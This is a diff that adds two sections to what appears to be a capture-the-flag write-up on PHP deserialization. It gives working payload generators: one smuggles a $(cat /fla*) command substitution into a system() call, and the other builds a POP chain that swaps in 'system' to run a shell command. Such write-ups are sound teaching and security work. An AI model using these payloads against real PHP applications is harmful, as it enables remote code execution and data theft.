@@ -273,3 +273,78 @@ with open("exploit", "wb") as f:
     f.write(serialized)
     f.close()
 ```
+
+## Serializable Cat [5]
+
+Unserialized Untrusted Input
+
+```php
+<?php
+
+class Cat
+{
+    public $name = '(guest cat)';
+    function __construct($name)
+    {
+        $this->name = $name;
+    }
+    function __wakeup()
+    {
+        echo "<pre>";
+        system("cowsay 'Welcome back, $this->name'");
+        echo "</pre>";
+    }
+}
+
+$cat = new Cat("'\"$(cat /fla*)\"'");
+echo base64_encode(serialize($cat));
+```
+
+## Serializable Magic Cat [15]
+
+POP Chain
+
+```php
+<?php
+
+class Magic
+{
+    function cast($spell)
+    {
+        echo "<script>alert('MAGIC, $spell!');</script>";
+    }
+}
+
+// Useless class?
+class Caster
+{
+    public $cast_func = 'intval';
+    function cast($val)
+    {
+        return ($this->cast_func)($val);
+    }
+}
+
+
+class Cat
+{
+    public $magic;
+    public $spell;
+    function __construct($spell)
+    {
+        $this->magic = new Magic();
+        $this->spell = $spell;
+    }
+    function __wakeup()
+    {
+        echo "Cat Wakeup!\n";
+        $this->magic->cast($this->spell);
+    }
+}
+
+$cat = new Cat("cat /fla*");
+$cat->magic = new Caster();
+$cat->magic->cast_func = "system";
+
+echo base64_encode(serialize($cat));
+```
